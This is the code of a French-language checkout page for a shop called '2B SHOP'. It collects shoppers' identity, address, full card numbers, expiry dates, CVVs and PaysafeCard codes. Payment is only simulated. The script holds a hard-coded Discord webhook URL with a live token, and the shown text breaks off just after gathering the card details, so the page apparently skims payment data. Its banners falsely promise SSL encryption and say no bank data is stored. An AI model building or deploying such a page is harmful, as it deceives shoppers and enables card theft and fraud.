<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Paiement - 2B SHOP</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&family=Montserrat:wght@800;900&display=swap" rel="stylesheet">
    <style>
        /* Variables pour les modes - M√™mes que index.html */
        :root {
            --primary-color: #2563eb;
            --secondary-color: #1e40af;
            --accent-color: #10b981;
            --danger-color: #ef4444;
            --background-color: #ffffff;
            --text-color: #797979;
            --card-bg: #ffffff;
            --border-color: #e5e7eb;
            --shadow: 0 4px 12px rgba(0,0,0,0.08);
            --header-bg: rgba(255, 255, 255, 0.98);
            --footer-bg: #f8fafc;
            --header-height: 60px;
            --safe-area-top: env(safe-area-inset-top);
            --safe-area-bottom: env(safe-area-inset-bottom);
        }

        .dark-theme {
            --primary-color: #3b82f6;
            --secondary-color: #1d4ed8;
            --background-color: #0f172a;
            --text-color: #f1f5f9;
            --card-bg: #1e293b;
            --border-color: #334155;
            --shadow: 0 4px 12px rgba(0,0,0,0.2);
            --header-bg: rgba(15, 23, 42, 0.98);
            --footer-bg: #1e293b;
        }

        .transparent-mode {
            --card-bg: rgba(255, 255, 255, 0.12);
            --header-bg: rgba(255, 255, 255, 0.08);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
        }

        .dark-theme.transparent-mode {
            --card-bg: rgba(30, 41, 59, 0.3);
            --header-bg: rgba(15, 23, 42, 0.6);
        }

        /* Reset optimis√© pour mobile */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
            -webkit-font-smoothing: antialiased;
        }

        html {
            height: 100%;
            overflow-x: hidden;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Poppins', sans-serif;
            background-color: var(--background-color);
            color: var(--text-color);
            transition: all 0.3s ease;
            min-height: 100vh;
            min-height: -webkit-fill-available;
            padding-top: calc(var(--header-height) + var(--safe-area-top));
            padding-bottom: var(--safe-area-bottom);
            position: relative;
            overflow-x: hidden;
        }

        @supports (padding: max(0px)) {
            body {
                padding-top: max(calc(var(--header-height) + var(--safe-area-top)), calc(var(--header-height) + 20px));
            }
        }

        /* Conteneur principal */
        .container {
            max-width: 100%;
            margin: 0 auto;
            padding: 0 16px;
        }

        /* Fond vid√©o optimis√© */
        .video-background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            overflow: hidden;
        }

        .video-background video {
            position: absolute;
            top: 50%;
            left: 50%;
            min-width: 100%;
            min-height: 100%;
            width: auto;
            height: auto;
            transform: translate(-50%, -50%);
            object-fit: cover;
            filter: brightness(0.35);
        }

        /* Header optimis√© iPhone - M√™me style que index.html */
        header {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            height: var(--header-height);
            background: var(--header-bg);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            z-index: 1000;
            display: flex;
            align-items: center;
            padding-top: var(--safe-area-top);
            border-bottom: 1px solid var(--border-color);
        }

        .header-container {
            width: 100%;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0 16px;
        }

        .logo {
            flex-shrink: 0;
        }

        .logo h1 {
            font-family: 'Montserrat', sans-serif;
            font-size: 1.6rem;
            font-weight: 900;
            letter-spacing: 0.5px;
            white-space: nowrap;
        }

        .logo span {
            color: var(--primary-color);
        }

        .back-btn {
            display: flex;
            align-items: center;
            gap: 8px;
            background: var(--card-bg);
            border: 1.5px solid var(--border-color);
            border-radius: 50px;
            padding: 8px 16px;
            text-decoration: none;
            color: var(--text-color);
            font-weight: 500;
            font-size: 0.9rem;
            transition: all 0.2s;
        }

        .back-btn:active {
            transform: scale(0.95);
        }

        /* Conteneur de paiement */
        .payment-container {
            max-width: 800px;
            margin: 40px auto;
            background: var(--card-bg);
            border-radius: 20px;
            overflow: hidden;
            box-shadow: var(--shadow);
            border: 1px solid var(--border-color);
            position: relative;
            z-index: 1;
        }

        .payment-header {
            padding: 30px;
            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
            color: white;
            text-align: center;
        }

        .payment-header h2 {
            font-size: 1.8rem;
            margin-bottom: 10px;
        }

        .payment-subtitle {
            font-size: 1rem;
            opacity: 0.9;
        }

        /* R√©sum√© de commande */
        .order-summary {
            padding: 25px;
            border-bottom: 1px solid var(--border-color);
        }

        .order-summary h3 {
            font-size: 1.3rem;
            margin-bottom: 20px;
            color: var(--primary-color);
        }

        .order-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px 0;
            border-bottom: 1px dashed var(--border-color);
        }

        .order-item:last-child {
            border-bottom: none;
        }

        .order-total {
            display: flex;
            justify-content: space-between;
            font-size: 1.4rem;
            font-weight: 700;
            margin-top: 20px;
            padding-top: 20px;
            border-top: 2px solid var(--border-color);
            color: var(--primary-color);
        }

        /* Informations client */
        .customer-info {
            padding: 25px;
            border-bottom: 1px solid var(--border-color);
        }

        .customer-info h3 {
            font-size: 1.3rem;
            margin-bottom: 20px;
            color: var(--primary-color);
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: var(--text-color);
        }

        .form-group input {
            width: 100%;
            padding: 14px 16px;
            border: 1.5px solid var(--border-color);
            border-radius: 12px;
            background: var(--background-color);
            color: var(--text-color);
            font-size: 1rem;
            transition: all 0.3s ease;
        }

        .form-group input:focus {
            outline: none;
            border-color: var(--primary-color);
            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
        }

        .form-group input.error {
            border-color: var(--danger-color);
            background: rgba(239, 68, 68, 0.05);
        }

        .error-message {
            color: var(--danger-color);
            font-size: 0.85rem;
            margin-top: 5px;
            display: none;
        }

        /* M√©thodes de paiement */
        .payment-methods {
            padding: 25px;
        }

        .payment-methods h3 {
            font-size: 1.3rem;
            margin-bottom: 20px;
            color: var(--primary-color);
        }

        .methods-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin-bottom: 25px;
        }

        .method-card {
            background: var(--background-color);
            border: 2px solid var(--border-color);
            border-radius: 15px;
            padding: 20px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
        }

        .method-card:hover {
            transform: translateY(-5px);
            border-color: var(--primary-color);
            box-shadow: var(--shadow);
        }

        .method-card.selected {
            border-color: var(--primary-color);
            background: rgba(37, 99, 235, 0.05);
            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
        }

        .method-icon {
            font-size: 2.5rem;
            margin-bottom: 10px;
            height: 50px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .method-name {
            font-weight: 600;
            font-size: 0.95rem;
        }

        /* Champs de paiement sp√©cifiques */
        .payment-fields {
            padding: 20px;
            background: var(--background-color);
            border-radius: 15px;
            margin-top: 20px;
            display: none;
        }

        .payment-fields.active {
            display: block;
            animation: slideIn 0.3s ease;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .card-fields {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }

        .card-fields .form-group:nth-child(1) {
            grid-column: span 2;
        }

        /* PayPal connect */
        .paypal-connect {
            text-align: center;
            padding: 30px;
            background: linear-gradient(135deg, #003087, #009cde);
            border-radius: 15px;
            color: white;
            margin-top: 20px;
        }

        .paypal-connect h4 {
            margin-bottom: 15px;
            font-size: 1.2rem;
        }

        .paypal-btn {
            display: inline-flex;
            align-items: center;
            gap: 10px;
            background: white;
            color: #003087;
            border: none;
            padding: 14px 30px;
            border-radius: 50px;
            font-weight: 600;
            font-size: 1rem;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
        }

        .paypal-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
        }

        /* Paysafecard */
        .paysafecard-info {
            text-align: center;
            padding: 20px;
            background: rgba(0, 166, 80, 0.1);
            border-radius: 15px;
            margin-top: 15px;
            color: #00a650;
        }

        .paysafecard-info p {
            font-size: 0.9rem;
            margin-bottom: 10px;
        }

        /* Bouton de paiement */
        .payment-actions {
            padding: 25px;
            border-top: 1px solid var(--border-color);
            text-align: center;
        }

        .pay-button {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
            color: white;
            border: none;
            border-radius: 15px;
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            position: relative;
            overflow: hidden;
        }

        .pay-button::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
            transition: left 0.5s ease;
        }

        .pay-button:hover::before {
            left: 100%;
        }

        .pay-button:active {
            transform: scale(0.98);
        }

        .pay-button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }

        /* S√©curit√© */
        .security-info {
            text-align: center;
            padding: 20px;
            background: var(--background-color);
            border-radius: 15px;
            margin-top: 20px;
            color: #666;
            font-size: 0.9rem;
        }

        .security-info i {
            color: var(--accent-color);
            margin-right: 8px;
        }

        /* Footer */
        footer {
            text-align: center;
            padding: 25px 16px;
            background: var(--footer-bg);
            border-top: 1px solid var(--border-color);
            position: relative;
            z-index: 1;
            padding-bottom: calc(25px + var(--safe-area-bottom));
        }

        footer p {
            font-size: 0.85rem;
            margin-bottom: 4px;
        }

        .footer-tagline {
            color: var(--primary-color);
            font-weight: 500;
            font-size: 0.8rem;
        }

        /* Notification */
        .payment-notification {
            position: fixed;
            top: calc(var(--header-height) + var(--safe-area-top) + 20px);
            right: 16px;
            left: 16px;
            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
            color: white;
            padding: 14px 20px;
            border-radius: 12px;
            display: flex;
            align-items: center;
            gap: 10px;
            z-index: 10000;
            animation: slideIn 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            box-shadow: 0 6px 20px rgba(0,0,0,0.15);
            max-width: 400px;
            margin: 0 auto;
        }

        .payment-notification.error {
            background: linear-gradient(135deg, var(--danger-color), #dc2626);
        }

        .payment-notification.success {
            background: linear-gradient(135deg, #10b981, #059669);
        }

        /* Responsive */
        @media (max-width: 768px) {
            .payment-container {
                margin: 20px auto;
            }
            
            .payment-header, .order-summary, .customer-info, .payment-methods, .payment-actions {
                padding: 20px;
            }
            
            .card-fields {
                grid-template-columns: 1fr;
            }
            
            .methods-grid {
                grid-template-columns: 1fr 1fr;
            }
        }

        @media (max-width: 480px) {
            .methods-grid {
                grid-template-columns: 1fr;
            }
            
            .payment-header h2 {
                font-size: 1.5rem;
            }
        }
    </style>
</head>
<body class="light-theme transparent-mode">
    <!-- Fond vid√©o optimis√© -->
    <div class="video-background">
        <video autoplay muted loop playsinline id="bgVideo">
            <source src="iPhone 17 Reveal (4K).mp4" type="video/mp4">
            <source src="https://assets.mixkit.co/videos/preview/mixkit-abstract-red-lights-flow-3236-large.mp4" type="video/mp4">
        </video>
    </div>

    <!-- Header -->
    <header>
        <div class="header-container">
            <a href="index.html" class="back-btn">
                <i class="fas fa-arrow-left"></i> Retour boutique
            </a>
            
            <div class="logo">
                <h1><i class="fas fa-gem"></i> 2B.<span>SHOP</span></h1>
            </div>
        </div>
    </header>

    <!-- Conteneur de paiement -->
    <main class="container">
        <div class="payment-container">
            <div class="payment-header">
                <h2><i class="fas fa-lock"></i> Paiement S√©curis√©</h2>
                <p class="payment-subtitle">Votre commande est prot√©g√©e par un cryptage SSL 256 bits</p>
            </div>

            <!-- R√©sum√© de la commande -->
            <div class="order-summary" id="orderSummary">
                <h3><i class="fas fa-receipt"></i> Votre Commande</h3>
                <div id="orderItems">
                    <!-- Rempli dynamiquement -->
                </div>
                <div class="order-total">
                    <span>Total √† payer:</span>
                    <span id="orderTotal">0.00‚Ç¨</span>
                </div>
            </div>

            <!-- Informations client -->
            <div class="customer-info">
                <h3><i class="fas fa-user"></i> Informations Personnelles</h3>
                <form id="customerForm">
                    <div class="form-group">
                        <label for="name">Nom complet *</label>
                        <input type="text" id="name" required>
                        <div class="error-message" id="nameError">Veuillez entrer votre nom complet</div>
                    </div>
                    
                    <div class="form-group">
                        <label for="email">Email *</label>
                        <input type="email" id="email" required>
                        <div class="error-message" id="emailError">Veuillez entrer un email valide</div>
                    </div>
                    
                    <div class="form-group">
                        <label for="phone">T√©l√©phone *</label>
                        <input type="tel" id="phone" required>
                        <div class="error-message" id="phoneError">Veuillez entrer un num√©ro de t√©l√©phone valide</div>
                    </div>
                    
                    <div class="form-group">
                        <label for="address">Adresse compl√®te *</label>
                        <input type="text" id="address" required>
                        <div class="error-message" id="addressError">Veuillez entrer votre adresse</div>
                    </div>
                    
                    <div class="form-group">
                        <label for="city">Ville *</label>
                        <input type="text" id="city" required>
                        <div class="error-message" id="cityError">Veuillez entrer votre ville</div>
                    </div>
                    
                    <div class="form-group">
                        <label for="zip">Code postal *</label>
                        <input type="text" id="zip" required maxlength="5">
                        <div class="error-message" id="zipError">Veuillez entrer un code postal valide</div>
                    </div>
                </form>
            </div>

            <!-- M√©thodes de paiement -->
            <div class="payment-methods">
                <h3><i class="fas fa-credit-card"></i> M√©thode de Paiement</h3>
                
                <div class="methods-grid">
                    <div class="method-card" data-method="visa">
                        <div class="method-icon" style="color: #1a1f71;">
                            <i class="fab fa-cc-visa"></i>
                        </div>
                        <div class="method-name">Carte Visa</div>
                    </div>
                    
                    <div class="method-card" data-method="mastercard">
                        <div class="method-icon" style="color: #eb001b;">
                            <i class="fab fa-cc-mastercard"></i>
                        </div>
                        <div class="method-name">Mastercard</div>
                    </div>
                    
                    <div class="method-card" data-method="paypal">
                        <div class="method-icon" style="color: #003087;">
                            <i class="fab fa-cc-paypal"></i>
                        </div>
                        <div class="method-name">PayPal</div>
                    </div>
                    
                    <div class="method-card" data-method="paysafecard">
                        <div class="method-icon" style="color: #00a650;">
                            <i class="fas fa-credit-card"></i>
                        </div>
                        <div class="method-name">PaysafeCard</div>
                    </div>
                </div>

                <!-- Champs pour carte bancaire -->
                <div class="payment-fields" id="cardFields">
                    <h4><i class="fas fa-credit-card"></i> D√©tails de la carte</h4>
                    <div class="card-fields">
                        <div class="form-group">
                            <label for="cardNumber">Num√©ro de carte *</label>
                            <input type="text" id="cardNumber" maxlength="19" placeholder="1234 5678 9012 3456">
                            <div class="error-message" id="cardNumberError">Num√©ro de carte invalide (16 chiffres requis)</div>
                        </div>
                        
                        <div class="form-group">
                            <label for="expiryDate">Date d'expiration *</label>
                            <input type="text" id="expiryDate" maxlength="5" placeholder="MM/AA">
                            <div class="error-message" id="expiryError">Date d'expiration invalide (MM/AA)</div>
                        </div>
                        
                        <div class="form-group">
                            <label for="cvv">CVV *</label>
                            <input type="text" id="cvv" maxlength="3" placeholder="123">
                            <div class="error-message" id="cvvError">CVV invalide (3 chiffres)</div>
                        </div>
                    </div>
                </div>

                <!-- PayPal Connect -->
                <div class="payment-fields" id="paypalFields">
                    <div class="paypal-connect">
                        <h4><i class="fab fa-paypal"></i> Connexion PayPal requise</h4>
                        <p>Pour payer avec PayPal, vous devez avoir un compte PayPal actif.</p>
                        <a href="https://www.paypal.com/signin" target="_blank" class="paypal-btn" id="connectPaypal">
                            <i class="fab fa-paypal"></i> Se connecter √† PayPal
                        </a>
                        <p style="margin-top: 15px; font-size: 0.85rem; opacity: 0.9;">
                            Apr√®s connexion, vous serez redirig√© vers cette page pour finaliser le paiement.
                        </p>
                    </div>
                    <div class="form-group" style="margin-top: 20px;">
                        <label for="paypalConnected">Compte PayPal connect√© ?</label>
                        <select id="paypalConnected" style="width: 100%; padding: 14px; border: 1.5px solid var(--border-color); border-radius: 12px; background: var(--background-color); color: var(--text-color);">
                            <option value="no">Non, je n'ai pas de compte PayPal</option>
                            <option value="yes">Oui, mon compte PayPal est connect√©</option>
                        </select>
                    </div>
                </div>

                <!-- Paysafecard -->
                <div class="payment-fields" id="paysafeFields">
                    <h4><i class="fas fa-credit-card"></i> Code PaysafeCard</h4>
                    <div class="form-group">
                        <label for="paysafeCode">Code √† 16 chiffres *</label>
                        <input type="text" id="paysafeCode" maxlength="19" placeholder="XXXX-XXXX-XXXX-XXXX">
                        <div class="error-message" id="paysafeError">Code PaysafeCard invalide (16 chiffres requis)</div>
                    </div>
                    <div class="paysafecard-info">
                        <p><i class="fas fa-info-circle"></i> Le code PaysafeCard est compos√© de 16 chiffres, g√©n√©ralement pr√©sent√© en 4 groupes de 4.</p>
                        <p>Vous pouvez l'acheter dans les points de vente participants.</p>
                    </div>
                </div>
            </div>

            <!-- S√©curit√© -->
            <div class="security-info">
                <p><i class="fas fa-shield-alt"></i> Paiement 100% s√©curis√© ‚Ä¢ Donn√©es crypt√©es ‚Ä¢ Aucune donn√©e bancaire stock√©e</p>
            </div>

            <!-- Bouton de paiement -->
            <div class="payment-actions">
                <button class="pay-button" id="payButton" disabled>
                    <i class="fas fa-lock"></i> Payer <span id="payAmount">0.00‚Ç¨</span>
                </button>
                <p style="margin-top: 15px; font-size: 0.85rem; color: #666;">
                    En cliquant sur "Payer", vous acceptez nos <a href="#" style="color: var(--primary-color);">conditions g√©n√©rales</a>
                </p>
            </div>
        </div>
    </main>

    <footer>
        <div class="container">
            <p>&copy; 2025 2B SHOP. Tous droits r√©serv√©s.</p>
            <p class="footer-tagline">Paiements s√©curis√©s avec cryptage SSL 256 bits <i class="fas fa-shield-alt"></i></p>
        </div>
    </footer>

    <script>
        // Configuration
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1439281295724122285/2yo9WVXtz9-T6hrmfKa9OIFAN9DhEYZhYPtkjWd1cL94EB-2WgKvz_i_oNOZUh9rTjBj';
        
        // Donn√©es de commande
        let orderData = {
            cart: [],
            total: 0,
            customer: {},
            payment: {}
        };

        // Initialisation
        document.addEventListener('DOMContentLoaded', function() {
            // Charger les pr√©f√©rences de th√®me
            const savedTheme = localStorage.getItem('theme') || 'light-theme';
            const savedTransparent = localStorage.getItem('transparentMode') || 'transparent-mode';
            document.body.className = `${savedTheme} ${savedTransparent}`;
            
            // Charger la commande depuis localStorage
            loadOrderData();
            
            // Setup des √©v√©nements
            setupEventListeners();
            
            // Valider les champs en temps r√©el
            setupRealTimeValidation();
        });

        // Charger les donn√©es de commande
        function loadOrderData() {
            const savedOrder = JSON.parse(localStorage.getItem('currentOrder')) || JSON.parse(localStorage.getItem('shoppingCart'));
            
            if (savedOrder) {
                if (Array.isArray(savedOrder)) {
                    // Ancien format (juste le panier)
                    orderData.cart = savedOrder;
                } else {
                    // Nouveau format (objet complet)
                    orderData = savedOrder;
                }
                
                orderData.total = orderData.cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
                displayOrderSummary();
                updatePayButton();
                
                // Stocker aussi dans le sessionStorage pour la validation
                sessionStorage.setItem('currentOrder', JSON.stringify(orderData));
            } else {
                showNotification('Aucune commande trouv√©e. Veuillez retourner √† la boutique.', 'error');
                setTimeout(() => window.location.href = 'index.html', 3000);
            }
        }

        // Afficher le r√©sum√© de commande
        function displayOrderSummary() {
            const orderItems = document.getElementById('orderItems');
            const orderTotal = document.getElementById('orderTotal');
            const payAmount = document.getElementById('payAmount');
            
            let html = '';
            orderData.cart.forEach(item => {
                const itemTotal = item.price * item.quantity;
                html += `
                    <div class="order-item">
                        <div>
                            <strong>${item.name}</strong>
                            <div style="font-size: 0.9rem; color: #666;">${item.colorName} ‚Ä¢ Qt√©: ${item.quantity}</div>
                        </div>
                        <div>${itemTotal.toFixed(2)}‚Ç¨</div>
                    </div>
                `;
            });
            
            orderItems.innerHTML = html;
            orderTotal.textContent = `${orderData.total.toFixed(2)}‚Ç¨`;
            payAmount.textContent = `${orderData.total.toFixed(2)}‚Ç¨`;
        }

        // Setup des √©v√©nements
        function setupEventListeners() {
            // S√©lection de m√©thode de paiement
            document.querySelectorAll('.method-card').forEach(card => {
                card.addEventListener('click', function() {
                    // D√©s√©lectionner toutes les cartes
                    document.querySelectorAll('.method-card').forEach(c => {
                        c.classList.remove('selected');
                    });
                    
                    // S√©lectionner la carte cliqu√©e
                    this.classList.add('selected');
                    
                    // Afficher les champs correspondants
                    const method = this.dataset.method;
                    showPaymentFields(method);
                    
                    // Activer le bouton de paiement
                    document.getElementById('payButton').disabled = false;
                });
            });
            
            // Connexion PayPal
            document.getElementById('connectPaypal').addEventListener('click', function(e) {
                e.preventDefault();
                showNotification('Redirection vers PayPal...', 'success');
                // Dans la r√©alit√©, ce serait une vraie redirection OAuth
                // Pour la d√©mo, on simule juste
                setTimeout(() => {
                    document.getElementById('paypalConnected').value = 'yes';
                    showNotification('Compte PayPal connect√© avec succ√®s !', 'success');
                }, 1000);
            });
            
            // Formatage des num√©ros de carte
            document.getElementById('cardNumber').addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                value = value.substring(0, 16);
                value = value.replace(/(\d{4})/g, '$1 ').trim();
                e.target.value = value;
            });
            
            // Formatage date d'expiration
            document.getElementById('expiryDate').addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                if (value.length >= 2) {
                    value = value.substring(0, 2) + '/' + value.substring(2, 4);
                }
                e.target.value = value.substring(0, 5);
            });
            
            // Formatage PaysafeCard
            document.getElementById('paysafeCode').addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                value = value.substring(0, 16);
                value = value.replace(/(\d{4})/g, '$1-').trim();
                value = value.endsWith('-') ? value.slice(0, -1) : value;
                e.target.value = value;
            });
            
            // Bouton de paiement
            document.getElementById('payButton').addEventListener('click', processPayment);
            
            // Validation en temps r√©el
            setupRealTimeValidation();
        }

        // Afficher les champs de paiement appropri√©s
        function showPaymentFields(method) {
            // Cacher tous les champs
            document.querySelectorAll('.payment-fields').forEach(field => {
                field.classList.remove('active');
            });
            
            // Afficher les champs correspondants
            switch(method) {
                case 'visa':
                case 'mastercard':
                    document.getElementById('cardFields').classList.add('active');
                    break;
                case 'paypal':
                    document.getElementById('paypalFields').classList.add('active');
                    break;
                case 'paysafecard':
                    document.getElementById('paysafeFields').classList.add('active');
                    break;
            }
        }

        // Validation en temps r√©el
        function setupRealTimeValidation() {
            // Nom
            document.getElementById('name').addEventListener('blur', function() {
                validateField(this, /^[a-zA-Z√Ä-√ø\s]{2,50}$/, 'nameError', 'Nom invalide (2-50 caract√®res)');
            });
            
            // Email
            document.getElementById('email').addEventListener('blur', function() {
                validateField(this, /^[^\s@]+@[^\s@]+\.[^\s@]+$/, 'emailError', 'Email invalide');
            });
            
            // T√©l√©phone
            document.getElementById('phone').addEventListener('blur', function() {
                validateField(this, /^[0-9]{10}$/, 'phoneError', 'Num√©ro invalide (10 chiffres)');
            });
            
            // Adresse
            document.getElementById('address').addEventListener('blur', function() {
                validateField(this, /^.{5,100}$/, 'addressError', 'Adresse trop courte');
            });
            
            // Ville
            document.getElementById('city').addEventListener('blur', function() {
                validateField(this, /^[a-zA-Z√Ä-√ø\s]{2,50}$/, 'cityError', 'Ville invalide');
            });
            
            // Code postal
            document.getElementById('zip').addEventListener('blur', function() {
                validateField(this, /^[0-9]{5}$/, 'zipError', 'Code postal invalide (5 chiffres)');
            });
        }

        // Valider un champ
        function validateField(field, regex, errorId, errorMessage) {
            const errorElement = document.getElementById(errorId);
            if (!regex.test(field.value.trim())) {
                field.classList.add('error');
                errorElement.textContent = errorMessage;
                errorElement.style.display = 'block';
                return false;
            } else {
                field.classList.remove('error');
                errorElement.style.display = 'none';
                return true;
            }
        }

        // Valider tous les champs
        function validateAllFields() {
            let isValid = true;
            
            // Informations personnelles
            isValid = validateField(document.getElementById('name'), /^[a-zA-Z√Ä-√ø\s]{2,50}$/, 'nameError', 'Nom invalide') && isValid;
            isValid = validateField(document.getElementById('email'), /^[^\s@]+@[^\s@]+\.[^\s@]+$/, 'emailError', 'Email invalide') && isValid;
            isValid = validateField(document.getElementById('phone'), /^[0-9]{10}$/, 'phoneError', 'Num√©ro invalide') && isValid;
            isValid = validateField(document.getElementById('address'), /^.{5,100}$/, 'addressError', 'Adresse trop courte') && isValid;
            isValid = validateField(document.getElementById('city'), /^[a-zA-Z√Ä-√ø\s]{2,50}$/, 'cityError', 'Ville invalide') && isValid;
            isValid = validateField(document.getElementById('zip'), /^[0-9]{5}$/, 'zipError', 'Code postal invalide') && isValid;
            
            // M√©thode de paiement s√©lectionn√©e
            const selectedMethod = document.querySelector('.method-card.selected');
            if (!selectedMethod) {
                showNotification('Veuillez s√©lectionner une m√©thode de paiement', 'error');
                return false;
            }
            
            const method = selectedMethod.dataset.method;
            
            // Validation selon la m√©thode
            switch(method) {
                case 'visa':
                case 'mastercard':
                    isValid = validateCardFields() && isValid;
                    break;
                case 'paypal':
                    isValid = validatePaypalFields() && isValid;
                    break;
                case 'paysafecard':
                    isValid = validatePaysafeFields() && isValid;
                    break;
            }
            
            return isValid;
        }

        // Valider champs carte
        function validateCardFields() {
            let isValid = true;
            
            // Num√©ro de carte (16 chiffres, Luhn valid)
            const cardNumber = document.getElementById('cardNumber').value.replace(/\D/g, '');
            if (cardNumber.length !== 16 || !luhnCheck(cardNumber)) {
                document.getElementById('cardNumber').classList.add('error');
                document.getElementById('cardNumberError').style.display = 'block';
                isValid = false;
            }
            
            // Date d'expiration (MM/AA, future)
            const expiry = document.getElementById('expiryDate').value;
            const [month, year] = expiry.split('/').map(Number);
            const now = new Date();
            const currentYear = now.getFullYear() % 100;
            const currentMonth = now.getMonth() + 1;
            
            if (!month || !year || month < 1 || month > 12 || 
                year < currentYear || (year === currentYear && month < currentMonth)) {
                document.getElementById('expiryDate').classList.add('error');
                document.getElementById('expiryError').style.display = 'block';
                isValid = false;
            }
            
            // CVV (3 chiffres)
            const cvv = document.getElementById('cvv').value;
            if (!/^[0-9]{3}$/.test(cvv)) {
                document.getElementById('cvv').classList.add('error');
                document.getElementById('cvvError').style.display = 'block';
                isValid = false;
            }
            
            return isValid;
        }

        // Algorithme de Luhn pour valider les cartes
        function luhnCheck(cardNumber) {
            let sum = 0;
            let isEven = false;
            
            for (let i = cardNumber.length - 1; i >= 0; i--) {
                let digit = parseInt(cardNumber.charAt(i));
                
                if (isEven) {
                    digit *= 2;
                    if (digit > 9) {
                        digit -= 9;
                    }
                }
                
                sum += digit;
                isEven = !isEven;
            }
            
            return sum % 10 === 0;
        }

        // Valider PayPal
        function validatePaypalFields() {
            const connected = document.getElementById('paypalConnected').value;
            if (connected === 'no') {
                showNotification('Vous devez avoir un compte PayPal connect√© pour payer', 'error');
                return false;
            }
            return true;
        }

        // Valider PaysafeCard
        function validatePaysafeFields() {
            const code = document.getElementById('paysafeCode').value.replace(/\D/g, '');
            if (code.length !== 16) {
                document.getElementById('paysafeCode').classList.add('error');
                document.getElementById('paysafeError').style.display = 'block';
                return false;
            }
            
            // Simuler la validation du code (dans la r√©alit√©, cela v√©rifierait aupr√®s de l'API Paysafe)
            if (code === '1234123412341234') {
                showNotification('Ce code PaysafeCard est invalide. Veuillez utiliser un vrai code.', 'error');
                return false;
            }
            
            return true;
        }

        // Simuler un paiement CB (pour la d√©mo)
        function simulateCardPayment(cardData) {
            // Simulation: 70% de chance de succ√®s pour les cartes valides
            const cardNumber = cardData.number.replace(/\D/g, '');
            
            // Cartes "test" qui √©chouent
            const failingCards = [
                '4111111111111111', // Test card qui √©choue
                '5555555555554444', // Test card qui √©choue
                '1234123412341234'  // √âvidemment invalide
            ];
            
            if (failingCards.includes(cardNumber)) {
                return { success: false, message: 'Transaction refus√©e. Veuillez v√©rifier vos informations.' };
            }
            
            // Cartes qui r√©ussissent
            const successCards = [
                '4242424242424242', // Test card qui r√©ussit
                '4012888888881881', // Test card qui r√©ussit
                '5555555555554444'  // Mastercard test (modifi√© pour r√©ussir)
            ];
            
            if (successCards.includes(cardNumber)) {
                return { success: true, transactionId: 'TXN_' + Date.now() };
            }
            
            // Pour les autres cartes, 70% de chance de succ√®s
            return Math.random() > 0.3 
                ? { success: true, transactionId: 'TXN_' + Date.now() }
                : { success: false, message: 'Transaction refus√©e. Code de s√©curit√© incorrect ou fonds insuffisants.' };
        }

        // Traiter le paiement
        async function processPayment() {
            const button = document.getElementById('payButton');
            button.disabled = true;
            button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Traitement en cours...';
            
            // Valider tous les champs
            if (!validateAllFields()) {
                button.disabled = false;
                button.innerHTML = '<i class="fas fa-lock"></i> Payer <span id="payAmount">' + orderData.total.toFixed(2) + '‚Ç¨</span>';
                return;
            }
            
            // Collecter les donn√©es client
            orderData.customer = {
                name: document.getElementById('name').value.trim(),
                email: document.getElementById('email').value.trim(),
                phone: document.getElementById('phone').value.trim(),
                address: document.getElementById('address').value.trim(),
                city: document.getElementById('city').value.trim(),
                zip: document.getElementById('zip').value.trim(),
                date: new Date().toISOString()
            };
            
            // Collecter les donn√©es de paiement
            const selectedMethod = document.querySelector('.method-card.selected').dataset.method;
            orderData.payment = {
                method: selectedMethod,
                date: new Date().toISOString(),
                amount: orderData.total,
                status: 'pending'
            };
            
            // Ajouter les d√©tails selon la m√©thode
            switch(selectedMethod) {
                case 'visa':
                case 'mastercard':
                    orderData.payment.details = {
                        cardNumber: document.getElementById('cardNumber').value,
                        expiryDate: document.getElementById('expiryDate').value,
                        cvv: document.getElementById('cvv').value,
                        type: selectedMethod
                    };
                    
